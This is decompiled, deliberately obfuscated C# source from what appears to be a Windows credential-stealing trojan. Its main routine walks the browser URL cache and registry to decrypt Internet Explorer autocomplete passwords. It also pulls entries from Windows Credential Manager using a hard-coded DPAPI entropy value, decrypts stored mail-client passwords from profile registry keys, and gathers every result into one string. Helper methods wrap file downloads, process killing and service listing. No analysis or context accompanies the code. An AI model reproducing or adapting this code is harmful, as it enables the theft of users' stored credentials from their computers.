using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.MyServices;
using Microsoft.Win32;
using O;

namespace ns0;

internal sealed class Class10
{
	private struct Struct3
	{
		public int int_0;

		public int int_1;

		public int int_2;

		public int int_3;

		public int int_4;

		public int int_5;

		public int int_6;

		public int int_7;

		public FILETIME filetime_0;

		public FILETIME filetime_1;

		public FILETIME filetime_2;

		public FILETIME filetime_3;

		public int int_8;

		public int int_9;

		public int int_10;

		public int int_11;
	}

	private struct Struct4
	{
		public int int_0;

		public int int_1;
	}

	private struct Struct5
	{
		public int int_0;

		public int int_1;

		public int int_2;

		public int int_3;

		public int int_4;

		public int int_5;
	}

	private struct Struct6
	{
		public int int_0;

		public FILETIME filetime_0;

		public int int_1;
	}

	private struct Struct7
	{
		public int int_0;

		public int int_1;

		public int int_2;

		public int int_3;

		public FILETIME filetime_0;

		public int int_4;

		public int int_5;

		public int int_6;

		public int int_7;

		public int int_8;

		public int int_9;

		public int int_10;
	}

	[DllImport("wininet.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FindFirstUrlCacheEntryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, IntPtr intptr_0, ref int int_0);

	[DllImport("wininet.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FindNextUrlCacheEntryA(int int_0, IntPtr intptr_0, ref int int_1);

	[DllImport("wininet.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FindCloseUrlCache(int int_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int lstrlenA(IntPtr intptr_0);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegOpenKeyExA(int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, int int_1, int int_2, ref int int_3);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegQueryValueExA(int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, int int_1, ref int int_2, IntPtr intptr_0, ref int int_3);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int LocalFree(int int_0);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegCloseKey(int int_0);

	[DllImport("crypt32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CryptUnprotectData(ref Struct4 struct4_0, int int_0, ref Struct4 struct4_1, int int_1, int int_2, int int_3, ref Struct4 struct4_2);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CredEnumerateW([MarshalAs(UnmanagedType.LPWStr)] string string_0, int int_0, ref int int_1, ref int int_2);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CredFree(int int_0);

	private string method_0(IntPtr intptr_0)
	{
		return Marshal.PtrToStringAnsi(intptr_0);
	}

	private byte method_1(ref string string_0)
	{
		int num = 0;
		int num2 = GForm1.smethod_3(string_0, 143, 219);
		checked
		{
			for (int i = 1; i <= num2; i += 2)
			{
				num += (int)GForm1.smethod_10(Class14.smethod_6(GClass1.smethod_3(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf343\uf32d", 62055), 59136), 59005), GClass1.smethod_1(string_0, i, 2, 267, 334), 412, 473), 'ʹ', 778), 'Χ', 'Ζ');
			}
			return (byte)unchecked(num % 256);
		}
	}

	private string method_2(ref byte[] byte_0)
	{
		checked
		{
			byte_0 = (byte[])Class11.smethod_10((Array)byte_0, (Array)new byte[byte_0.Length + 1 + 1], 'ǝ', 473);
			byte[] array = (byte[])(Array)SHA1.Create().ComputeHash(byte_0);
			string text = (string)(IConvertible)"";
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				text = (string)(IConvertible)GClass1.smethod_3(text, Strings.Right(GClass1.smethod_3(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue68a\ue68a", 57950), 60705), 59716), Conversion.Hex(array[i]), 139, 206), 2), 654, 715);
			}
			return text;
		}
	}

	private void method_3(string string_0, string string_1, Struct4 struct4_0)
	{
		Struct6 @struct = default(Struct6);
		int num = Strings.Len((object)@struct);
		Struct5 struct2 = default(Struct5);
		Strings.Len((object)struct2);
		checked
		{
			IntPtr intptr_ = new IntPtr(struct4_0.int_1 + unchecked((int)Marshal.ReadByte(new IntPtr(struct4_0.int_1))));
			object obj = GClass1.smethod_6(intptr_, GClass2.DRV.smethod_5((object)struct2, 859, '\u0304'), 294, 319);
			struct2 = ((obj != null) ? ((Struct5)obj) : default(Struct5));
			if (struct2.int_4 == 1)
			{
				if (struct2.int_2 < 2)
				{
					return;
				}
				IntPtr intptr_2 = new IntPtr(Class3.smethod_1(ref intptr_, 'ɔ', 518) + struct2.int_1);
				IntPtr intptr_3 = new IntPtr(Class3.smethod_1(ref intptr_2, '\u034c', 798) + struct2.int_2 * num);
				int num2 = struct2.int_2 - 1;
				for (int i = 0; i <= num2; i += 2)
				{
					if (GForm1.smethod_11(intptr_3, IntPtr.Zero, 504, 448) | GForm1.smethod_11(intptr_2, IntPtr.Zero, 506, 450))
					{
						break;
					}
					object obj2 = GClass1.smethod_6(intptr_2, GClass2.DRV.smethod_5((object)@struct, 1020, 'Σ'), 258, 283);
					@struct = ((obj2 != null) ? ((Struct6)obj2) : default(Struct6));
					string text = (string)((lstrlenA(new IntPtr(Class3.smethod_1(ref intptr_3, '\u02ea', 696) + @struct.int_0)) == @struct.int_1) ? ((IEnumerable)Marshal.PtrToStringAnsi(new IntPtr(Class3.smethod_1(ref intptr_3, 'Ō', 286) + @struct.int_0))) : ((IEnumerable)smethod_0(new IntPtr(Class3.smethod_1(ref intptr_3, 'ɹ', 555) + @struct.int_0), 748, 764)));
					intptr_2 = new IntPtr(Class3.smethod_1(ref intptr_2, 'Ơ', 498) + num);
					object obj3 = GClass1.smethod_6(intptr_2, GClass2.DRV.smethod_5((object)@struct, 734, 'ʁ'), 772, 797);
					@struct = ((obj3 != null) ? ((Struct6)obj3) : default(Struct6));
					string text2 = (string)(IEnumerable<char>)smethod_2(@struct.int_1, 'ɭ', 635);
					text2 = (string)((lstrlenA(new IntPtr(Class3.smethod_1(ref intptr_3, 'χ', 917) + @struct.int_0)) == @struct.int_1) ? ((IEnumerable<char>)Marshal.PtrToStringAnsi(new IntPtr(Class3.smethod_1(ref intptr_3, 't', 38) + @struct.int_0))) : ((IEnumerable<char>)smethod_0(new IntPtr(Class3.smethod_1(ref intptr_3, 'ʰ', 738) + @struct.int_0), 36, 52)));
					intptr_2 = new IntPtr(Class3.smethod_1(ref intptr_2, '\u0323', 881) + num);
					Class2.string_1 = GClass2.smethod_1(new string[8]
					{
						Class2.string_1,
						Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf2b2\uf29b\uf29c\uf282\uf2b2\uf2ee", 62121), 59359), 59274),
						string_0,
						Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue1eb\ue1ec\ue19a\ue1b3\ue1b5\ue1b4\ue19a\ue1c6", 59023), 58798), 57974),
						text,
						Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ued33\ued34\ued42\ued6e\ued69\ued7a\ued42\ued1e", 59420), 62334), 63001),
						text2,
						Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uea7a\uea7d", 58098), 59743), 57706)
					}, 700, '\u02d4');
				}
			}
			else
			{
				if (struct2.int_4 != 0)
				{
					return;
				}
				string text2 = null;
				IntPtr intptr_2 = new IntPtr(Class3.smethod_1(ref intptr_, 'ȏ', 605) + struct2.int_1);
				IntPtr intptr_3 = new IntPtr(Class3.smethod_1(ref intptr_2, 'ʗ', 709) + struct2.int_2 * num);
				if (!(GForm1.smethod_11(intptr_3, IntPtr.Zero, 0, 56) | GForm1.smethod_11(intptr_2, IntPtr.Zero, 494, 470)))
				{
					int num3 = struct2.int_2 - 1;
					for (int j = 0; j <= num3; j++)
					{
						object obj4 = GClass1.smethod_6(intptr_2, GClass2.DRV.smethod_5((object)@struct, 721, 'ʎ'), 518, 543);
						@struct = ((obj4 != null) ? ((Struct6)obj4) : default(Struct6));
						string text = (string)(IEnumerable)smethod_2(@struct.int_1, '\u0369', 895);
						text = (string)((lstrlenA(new IntPtr(Class3.smethod_1(ref intptr_3, 'Ʊ', 483) + @struct.int_0)) == @struct.int_1) ? ((IEnumerable)Marshal.PtrToStringAnsi(new IntPtr(Class3.smethod_1(ref intptr_3, '\u008f', 221) + @struct.int_0))) : ((IEnumerable)smethod_0(new IntPtr(Class3.smethod_1(ref intptr_3, '\u0332', 864) + @struct.int_0), 38, 54)));
						intptr_2 = new IntPtr(intptr_2.ToInt32() + num);
						Class2.string_1 = Class2.string_1 + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf2b2\uf29b\uf29c\uf282\uf2b2\uf2ee", 62121), 59359), 59274) + string_0 + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue1eb\ue1ec\ue19a\ue1b3\ue1b5\ue1b4\ue19a\ue1c6", 59023), 58798), 57974) + text + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ued33\ued34\ued42\ued6e\ued69\ued7a\ued42\ued1e", 59420), 62334), 63001) + text2 + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uea7a\uea7d", 58098), 59743), 57706);
					}
				}
			}
		}
	}

	private void method_4(string string_0, int int_0)
	{
		string_0 = Class3.smethod_2(string_0, 647, 730);
		byte[] byte_ = Class3.smethod_5(Class11.smethod_11(762, 714), string_0, 261, 'ŭ');
		string string_ = method_2(ref byte_);
		string_ = GClass1.smethod_3(string_, Strings.Right(GClass1.smethod_3(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue68a\ue68a", 57950), 60705), 59716), Conversion.Hex(method_1(ref string_)), 23, 82), 2), 382, 315);
		int int_ = default(int);
		int int_2 = default(int);
		RegQueryValueExA(int_0, ref string_, 0, ref int_, IntPtr.Zero, ref int_2);
		if (int_2 > 0)
		{
			IntPtr intptr_ = Class12.smethod_5(int_2, '\u0092', '\u0091');
			RegQueryValueExA(int_0, ref string_, 0, ref int_, intptr_, ref int_2);
			Struct4 struct4_ = default(Struct4);
			struct4_.int_0 = int_2;
			struct4_.int_1 = Class3.smethod_1(ref intptr_, 'v', 36);
			Struct4 struct4_2 = default(Struct4);
			struct4_2.int_0 = checked(GForm1.smethod_3(string_0, 943, 1019) * 2 + 2);
			IntPtr intptr_2 = smethod_3(string_0, 371, 'ŝ');
			struct4_2.int_1 = Class3.smethod_1(ref intptr_2, 'é', 187);
			Struct4 struct4_3 = default(Struct4);
			CryptUnprotectData(ref struct4_, 0, ref struct4_2, 0, 0, 0, ref struct4_3);
			method_3(string_0, string_, struct4_3);
			Marshal.FreeHGlobal(new IntPtr(struct4_2.int_1));
			LocalFree(struct4_3.int_1);
		}
	}

	protected string method_5(IntPtr intptr_0)
	{
		return smethod_0(intptr_0, 554, 570);
	}

	public void method_6()
	{
		checked
		{
			try
			{
				Regex gparam_ = new Regex(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue4b8\ue4b7\ue4bb\ue4b3\ue4eb\ue4f4\ue4fe\ue48d\ue488\ue4f4\ue48b\ue4fd\ue4ff\ue4f4", 57734), 58640), 57375), RegexOptions.Compiled);
				string string_ = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue456\ue46a\ue463\ue471\ue472\ue464\ue477\ue460\ue459\ue448\ue46c\ue466\ue477\ue46a\ue476\ue46a\ue463\ue471\ue459\ue44c\ue46b\ue471\ue460\ue477\ue46b\ue460\ue471\ue425\ue440\ue47d\ue475\ue469\ue46a\ue477\ue460\ue477\ue459\ue44c\ue46b\ue471\ue460\ue469\ue469\ue46c\ue443\ue46a\ue477\ue468\ue476\ue459\ue456\ue471\ue46a\ue477\ue464\ue462\ue460\ue434", 63619), 63405), 60240);
				int int_ = default(int);
				RegOpenKeyExA(-2147483647, ref string_, 0, 131097, ref int_);
				string_ = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf185\uf1b9\uf1b0\uf1a2\uf1a1\uf1b7\uf1a4\uf1b3\uf18a\uf19b\uf1bf\uf1b5\uf1a4\uf1b9\uf1a5\uf1b9\uf1b0\uf1a2\uf18a\uf19f\uf1b8\uf1a2\uf1b3\uf1a4\uf1b8\uf1b3\uf1a2\uf1f6\uf193\uf1ae\uf1a6\uf1ba\uf1b9\uf1a4\uf1b3\uf1a4\uf18a\uf19f\uf1b8\uf1a2\uf1b3\uf1ba\uf1ba\uf1bf\uf190\uf1b9\uf1a4\uf1bb\uf1a5\uf18a\uf185\uf1a2\uf1b9\uf1a4\uf1b7\uf1b1\uf1b3\uf1e4", 58246), 63551), 60110);
				int int_2 = default(int);
				RegOpenKeyExA(-2147483647, ref string_, 0, 131097, ref int_2);
				if (int_2 != 0 || int_ != 0)
				{
					string_ = null;
					int int_3 = default(int);
					int num = FindFirstUrlCacheEntryA(ref string_, IntPtr.Zero, ref int_3);
					if (int_3 > 0)
					{
						IntPtr intPtr = Class12.smethod_5(int_3, '\b', '\v');
						Marshal.WriteInt32(intPtr, int_3);
						string_ = null;
						num = FindFirstUrlCacheEntryA(ref string_, intPtr, ref int_3);
						Struct3 @struct = default(Struct3);
						IEnumerator enumerator = default(IEnumerator);
						do
						{
							object obj = GClass1.smethod_6(intPtr, GClass2.DRV.smethod_5((object)@struct, 461, 'ƒ'), 788, 781);
							@struct = ((obj == null) ? default(Struct3) : ((Struct3)obj));
							if ((unchecked((uint)@struct.int_3) & 0x200001u) != 0)
							{
								string text = method_0(new IntPtr(@struct.int_1));
								if (text.IndexOf(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue2d2", 57809), 61125), 60754)) >= 0)
								{
									text = Class3.smethod_6(text, 0, text.IndexOf(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue2d2", 57809), 61125), 60754)), 394, 488);
								}
								if (Strings.InStr(text, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﺯ", 62795), 57835), 59980), (CompareMethod)0) > 0)
								{
									text = Strings.Mid(text, Strings.InStr(text, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﺯ", 62795), 57835), 59980), (CompareMethod)0) + 1);
								}
								if (int_ != 0 && (@struct.int_3 & 1) == 1)
								{
									string text2 = (string)(IConvertible)method_0(new IntPtr(@struct.int_8));
									if (!string.IsNullOrEmpty(text2) && text2.Contains(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue895\ue884\ue899\ue895\ue8ce\ue889\ue895\ue88c\ue88d", 60213), 61095), 60728)))
									{
										string gparam_2 = (string)(ICloneable)method_0(new IntPtr(@struct.int_2));
										try
										{
											try
											{
												enumerator = smethod_4(gparam_, Class3.smethod_2(gparam_2, 776, 854), 901, 1022).GetEnumerator();
												while (enumerator.MoveNext())
												{
													Match match = (Match)enumerator.Current;
													method_4(Class11.smethod_12(match.Groups, 1, 529, 578).Value, int_);
												}
											}
											finally
											{
												if (enumerator is IDisposable)
												{
													(enumerator as IDisposable).Dispose();
												}
											}
										}
										catch (Exception gparam_3)
										{
											GForm1.smethod_6(gparam_3, '\u0307', 800);
											Class5.smethod_4('\u0342', 823);
										}
									}
								}
								method_4(text, int_2);
							}
							int_3 = 0;
							FindNextUrlCacheEntryA(num, IntPtr.Zero, ref int_3);
							Marshal.FreeHGlobal(intPtr);
							if (int_3 > 0)
							{
								intPtr = Class12.smethod_5(int_3, 'Ą', 'ć');
								Marshal.WriteInt32(intPtr, int_3);
							}
						}
						while (FindNextUrlCacheEntryA(num, intPtr, ref int_3) != 0);
						FindCloseUrlCache(num);
					}
					RegCloseKey(int_);
					RegCloseKey(int_2);
				}
				int int_4 = default(int);
				int int_5 = default(int);
				CredEnumerateW(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue4d0\ue4f4\ue4fe\ue4ef\ue4f2\ue4ee\ue4f2\ue4fb\ue4e9\ue4c2\ue4ca\ue4f4\ue4f3\ue4d4\ue4f3\ue4f8\ue4e9\ue4c2\ue4b7", 62891), 62450), 58053), 0, ref int_4, ref int_5);
				Struct4 struct4_ = default(Struct4);
				Struct4 struct4_2 = default(Struct4);
				Struct4 struct4_3 = default(Struct4);
				if (int_4 > 0)
				{
					int num2 = int_4 - 1;
					Struct7 struct2 = default(Struct7);
					for (int i = 0; i <= num2; i++)
					{
						IntPtr intPtr = Marshal.ReadIntPtr(new IntPtr(int_5 + i * 4));
						object obj2 = GClass1.smethod_6(intPtr, GClass2.DRV.smethod_5((object)struct2, 852, '\u030b'), 734, 711);
						struct2 = ((obj2 != null) ? ((Struct7)obj2) : default(Struct7));
						string text3 = method_5(new IntPtr(struct2.int_2));
						struct4_.int_0 = 74;
						intPtr = Class12.smethod_5(74, 'Ę', 'ě');
						string gparam_4 = (string)(IEquatable<string>)Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue35f\ue35c\ue35b\ue30c\ue306\ue308\ue307\ue358\ue313\ue307\ue35c\ue30a\ue309\ue313\ue30a\ue35d\ue35a\ue307\ue313\ue35f\ue30d\ue30b\ue306\ue313\ue35d\ue30c\ue30c\ue307\ue30e\ue30a\ue35a\ue35c\ue35f\ue309\ue358\ue309\ue33e", 57778), 58971), 58487);
						int num3 = 0;
						do
						{
							Marshal.WriteInt16(intPtr, num3 * 2, (short)(GClass2.DRV.smethod_1(GClass1.smethod_1(gparam_4, num3 + 1, 1, 787, 854), 186, 231) * 4));
							num3++;
						}
						while (num3 <= 36);
						struct4_.int_1 = Class3.smethod_1(ref intPtr, 'Č', 350);
						struct4_2.int_1 = struct2.int_5;
						struct4_2.int_0 = struct2.int_4;
						struct4_3.int_0 = 0;
						struct4_3.int_1 = 0;
						CryptUnprotectData(ref struct4_2, 0, ref struct4_, 0, 0, 0, ref struct4_3);
						Marshal.FreeHGlobal(intPtr);
						string[] array = GClass2.DRV.smethod_7(smethod_0(new IntPtr(struct4_3.int_1), 542, 526), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uee95", 61341), 57885), 58351), -1, (CompareMethod)0, 'ă', 'ĉ');
						int num4 = Strings.InStr(Strings.Mid(text3, 19), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("老", 59546), 61996), 58236), (CompareMethod)0);
						Class2.string_1 = GClass2.smethod_1(new string[8]
						{
							Class2.string_1,
							Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf2b2\uf29b\uf29c\uf282\uf2b2\uf2ee", 62121), 59359), 59274),
							GClass1.smethod_1(text3, 19, num4 - 1, 928, 997),
							Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue1eb\ue1ec\ue19a\ue1b3\ue1b5\ue1b4\ue19a\ue1c6", 59023), 58798), 57974),
							array[0],
							Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ued33\ued34\ued42\ued6e\ued69\ued7a\ued42\ued1e", 59420), 62334), 63001),
							array[1],
							Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uea7a\uea7d", 58098), 59743), 57706)
						}, 994, 'Ί');
						LocalFree(struct4_3.int_1);
					}
				}
				CredFree(int_5);
				RegistryKey gparam_5 = (RegistryKey)(IDisposable)Class11.smethod_13(Registry.CurrentUser, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf62f\uf613\uf61a\uf608\uf60b\uf61d\uf60e\uf619\uf620\uf631\uf615\uf61f\uf60e\uf613\uf60f\uf613\uf61a\uf608\uf620\uf63a\uf628\uf62c\uf620\uf63d\uf61f\uf61f\uf613\uf609\uf612\uf608\uf60f", 60976), 60822), 62817), 246, 203);
				string[] array2 = (string[])(Array)GForm1.smethod_15(gparam_5, 568, 534);
				foreach (string text4 in array2)
				{
					RegistryKey gparam_6 = (RegistryKey)(IDisposable)Class11.smethod_13(gparam_5, text4, 568, 517);
					string[] array3 = (string[])(Array)GForm1.smethod_15(gparam_6, 117, 91);
					foreach (string text5 in array3)
					{
						byte[] array4 = (byte[])GClass2.smethod_7(Class11.smethod_13(gparam_6, text5, 112, 77), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue70f\ue73e\ue72c\ue72c\ue728\ue730\ue72d\ue73b", 58679), 59980), 59412), ' ', 33);
						byte[] array5 = new byte[4];
						int num5 = GClass2.DRV.smethod_1(text4, 233, 183) - 1;
						for (int l = 0; l <= num5; l++)
						{
							byte b = (byte)(text4[l] & 0x1F);
							array5[l & 3] = (byte)unchecked((uint)(array5[l & 3] + b));
						}
						struct4_2.int_0 = array4.Length;
						IntPtr intptr_ = Class12.smethod_5(array4.Length, '\u02e6', '\u02e5');
						struct4_2.int_1 = Class3.smethod_1(ref intptr_, 'ώ', 924);
						Marshal.Copy(array4, 0, new IntPtr(struct4_2.int_1), array4.Length);
						struct4_3.int_0 = 0;
						struct4_3.int_1 = 0;
						GCHandle gCHandle = Class11.smethod_14((object)array5, GCHandleType.Pinned, 149, '\u0094');
						intptr_ = gCHandle.AddrOfPinnedObject();
						struct4_.int_1 = Class3.smethod_1(ref intptr_, 'ś', 265);
						struct4_.int_0 = 4;
						CryptUnprotectData(ref struct4_2, 0, ref struct4_, 0, 0, 0, ref struct4_3);
						gCHandle.Free();
						Class2.string_1 = Class2.string_1 + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf2b2\uf29b\uf29c\uf282\uf2b2\uf2ee", 62121), 59359), 59274) + string.Format(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue0cd\ue0df\ue0db\ue091\ue084\ue084\ue0d0\ue09b\ue0d6\ue0eb\ue0d0\ue09a\ue0d6\ue084", 60207), 60149), 57697), text4, text5) + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue1eb\ue1ec\ue19a\ue1b3\ue1b5\ue1b4\ue19a\ue1c6", 59023), 58798), 57974) + text5 + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ued33\ued34\ued42\ued6e\ued69\ued7a\ued42\ued1e", 59420), 62334), 63001) + Marshal.PtrToStringUni(new IntPtr(struct4_3.int_1)) + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uea7a\uea7d", 58098), 59743), 57706);
						LocalFree(struct4_3.int_1);
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	internal static string smethod_0(IntPtr intptr_0, short short_0, short short_1)
	{
		int num = 0;
		string result;
		do
		{
			result = (((short_1 ^ short_0) - 16) ^ num) switch
			{
				0 => (string)(IComparable<string>)Marshal.PtrToStringUni(intptr_0), 
				_ => null, 
			};
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	internal static object smethod_1<T, U>(T gparam_0, U gparam_1, char char_0, short short_0) where T : Collection where U : string
	{
		int num = 0;
		object result = (((char_0 ^ short_0) - 98) ^ 0) switch
		{
			0 => ((Collection)gparam_0).get_Item((string)gparam_1), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static string smethod_2(int int_0, char char_0, int int_1)
	{
		int num = 0;
		string result;
		int num2;
		do
		{
			result = (((char_0 ^ int_1) - 22) ^ num) switch
			{
				1 => (string)(IComparable<string>)Conversion.Hex(int_0), 
				0 => (string)(IComparable<string>)Strings.Space(int_0), 
				_ => null, 
			};
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static IntPtr smethod_3<T>(T gparam_0, int int_0, char char_0) where T : string
	{
		int num = 0;
		IntPtr result = (((char_0 ^ int_0) - 46) ^ 0) switch
		{
			0 => Marshal.StringToHGlobalUni(gparam_0), 
			_ => default(IntPtr), 
		};
		num++;
		return result;
	}

	internal static MatchCollection smethod_4<T, U>(T gparam_0, U gparam_1, int int_0, int int_1) where T : Regex where U : string
	{
		int num = 0;
		MatchCollection result = (((int_1 ^ int_0) - 123) ^ 0) switch
		{
			0 => gparam_0.Matches(gparam_1), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static void smethod_5<T>(T gparam_0, Color color_0, short short_0, char char_0) where T : TextBoxBase
	{
		int num = 0;
		do
		{
			switch (((short_0 ^ char_0) - 52) ^ num)
			{
			case 0:
				((TextBoxBase)gparam_0).set_ForeColor(color_0);
				break;
			}
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
	}

	internal static string smethod_6<T>(T gparam_0, short short_0, char char_0) where T : ComputerInfo
	{
		int num = 0;
		string result;
		do
		{
			result = (((short_0 ^ char_0) - 64) ^ num) switch
			{
				0 => (string)(ICloneable)((ComputerInfo)gparam_0).get_OSFullName(), 
				_ => null, 
			};
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	internal static object smethod_7<T, U>(U gparam_0, T gparam_1, int int_0, int int_1) where T : Type
	{
		int num = 0;
		object result = (((int_1 ^ int_0) - 86) ^ 0) switch
		{
			0 => Conversions.ChangeType((object)gparam_0, (Type)gparam_1), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static void smethod_8<T>(T gparam_0, bool bool_0, int int_0, char char_0) where T : StreamWriter
	{
		int num = 0;
		do
		{
			switch (((int_0 ^ char_0) - 123) ^ num)
			{
			case 0:
				gparam_0.AutoFlush = bool_0;
				break;
			}
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
	}

	internal static FileInfo[] smethod_9<T, U>(U gparam_0, T gparam_1, int int_0, char char_0) where T : string where U : DirectoryInfo
	{
		int num = 0;
		FileInfo[] result = (((char_0 ^ int_0) - 4) ^ 0) switch
		{
			0 => (FileInfo[])(Array)gparam_0.GetFiles(gparam_1), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static FileAttribute smethod_10<T>(T gparam_0, int int_0, int int_1) where T : string
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		int num = 0;
		FileAttribute result = (FileAttribute)((((int_1 ^ int_0) - 106) ^ 0) switch
		{
			0 => FileSystem.GetAttr((string)gparam_0), 
			_ => 0, 
		});
		num++;
		return result;
	}

	internal static byte[] smethod_11<T, U>(U gparam_0, T gparam_1, short short_0, short short_1) where T : string where U : WebClient
	{
		int num = 0;
		byte[] result;
		do
		{
			result = (((short_0 ^ short_1) - 13) ^ num) switch
			{
				0 => gparam_0.DownloadData(gparam_1), 
				_ => null, 
			};
			num++;
		}
		while ((short_1 * short_1 + short_1) % 2 != 0);
		return result;
	}

	internal static FileSystemProxy smethod_12<T>(T gparam_0, int int_0, short short_0) where T : ServerComputer
	{
		int num = 0;
		FileSystemProxy result;
		do
		{
			result = (FileSystemProxy)((((int_0 ^ short_0) - 42) ^ num) switch
			{
				0 => ((ServerComputer)gparam_0).get_FileSystem(), 
				_ => null, 
			});
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	internal static Network smethod_13<T>(T gparam_0, char char_0, int int_0) where T : ServerComputer
	{
		int num = 0;
		Network result = (Network)((((char_0 ^ int_0) - 86) ^ 0) switch
		{
			0 => ((ServerComputer)gparam_0).get_Network(), 
			_ => null, 
		});
		num++;
		return result;
	}

	internal static ProcessModule smethod_14<T>(T gparam_0, int int_0, int int_1) where T : Process
	{
		int num = 0;
		ProcessModule result = (((int_1 ^ int_0) - 3) ^ 0) switch
		{
			0 => gparam_0.MainModule, 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static void smethod_15<T>(T gparam_0, char char_0, int int_0) where T : Process
	{
		int num = 0;
		switch (((int_0 ^ char_0) - 76) ^ 0)
		{
		case 0:
			gparam_0.Kill();
			break;
		}
		num++;
	}

	internal static object smethod_16<T, U>(U gparam_0, T gparam_1, short short_0, char char_0) where T : Delegate where U : Control
	{
		int num = 0;
		object result = (((short_0 ^ char_0) - 25) ^ 0) switch
		{
			0 => ((Control)gparam_0).Invoke((Delegate)gparam_1), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static ServiceController[] smethod_17(int int_0, char char_0)
	{
		int num = 0;
		ServiceController[] result;
		do
		{
			result = (((int_0 ^ char_0) - 67) ^ num) switch
			{
				0 => ServiceController.GetServices(), 
				_ => null, 
			};
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}

	internal static DirectoryInfo smethod_18<T>(T gparam_0, int int_0, int int_1) where T : DirectoryInfo
	{
		int num = 0;
		DirectoryInfo result = (((int_0 ^ int_1) - 33) ^ 0) switch
		{
			0 => gparam_0.Parent, 
			_ => null, 
		};
		num++;
		return result;
	}
}
